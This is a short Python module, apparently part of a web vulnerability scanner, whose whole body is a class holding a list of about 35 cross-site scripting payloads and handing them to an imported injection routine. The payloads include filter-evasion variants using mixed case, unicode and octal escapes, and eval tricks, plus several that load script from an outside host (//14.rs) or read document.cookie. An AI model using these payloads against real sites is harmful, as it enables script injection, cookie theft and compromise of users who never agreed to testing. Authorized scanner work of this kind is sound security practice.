import time
import sys
sys.path.append("../")
from run import payloadlist_xss


class Payloadlist_xss:
    def __init__(self):
        self.requestdict = {}

    def run(self, requestdict):
        payloadlist = ["<script>alert(vulnerable)</script>", "<script>alert(40)</script>",
                       '\'"</Script><Html Onmouseover=(confirm)()//', '<imG/sRc=l oNerrOr=(prompt)() x>',
                       '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>', '<deTails open oNToggle=confirm()>',
                       '<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=">"/onload=confirm()//',
                       '<svg%0Aonload=%09((pro\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
                       '<sCript x>confirm``</scRipt x>', '<Script x>prompt()</scRiPt x>', '<sCriPt sRc=//14.rs>',
                       '<embed//sRc=//14.rs>', '<base href=//14.rs/><script src=/>', '<object//data=//14.rs>',
                       '<s=" onclick=confirm``>clickme', '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
                       '\'"><y///oNMousEDown=((confirm))()>Click',
                       '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
                       '<img src=x onerror=confir\u006d`1`>', '<svg/onload=confirm`1`>',
                       "<Img src=\"\" onerror=\"alert(4)\"/>", "';`\"><aaa bbb=ccc>ddd<aaa/>",
                       "<img onerror='alert(26)'src=a>", "<script>a\u006cert(40)</script>",
                       "<script>eval('a\u006cert(41)')</script>", "<script>eval('a\x6cert(42)')</script>",
                       "<script>eval('a\154ert(43)')</script>", "<script>eval('a\l\ert\(44\)')</script>",
                       "<script>'alert(49)'.replace(/.+/,eval)</script>", "<script>function::['alert'](50)</script>",
                       "<script>function::['alert'](50)</script>", "</script> <script> alert(document.domain);var a=\"",
                       "'-alert(document.cookie)-'"]

        self.requestdict = requestdict
        print("run Payloadlist_xss" + str(self.requestdict))
        payloadlist_xss(payloadlist, self.requestdict)
